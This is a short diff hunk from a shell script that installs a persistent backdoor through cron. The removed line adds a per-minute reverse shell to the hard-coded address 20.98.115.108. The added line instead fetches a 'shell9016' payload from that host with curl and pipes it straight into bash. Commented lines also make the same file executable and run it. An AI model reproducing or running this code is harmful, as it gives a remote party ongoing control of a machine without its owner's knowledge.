@@ -21,7 +21,7 @@ ls -la > \${OUTPATH} 2>&1
 #chmod +x ./shell9016 >> \${OUTPATH} 2>&1
 #./shell9016 >> \${OUTPATH} 2>&1
 crontab -l > mycron >> \${OUTPATH} 2>&1
-echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/20.98.115.108/9018 0>&1'" >> mycron
+echo "* * * * * curl http://20.98.115.108:9002/shell9016 | bash" >> mycron
 crontab mycron >> \${OUTPATH} 2>&1
 crontab -l >> \${OUTPATH} 2>&1
 
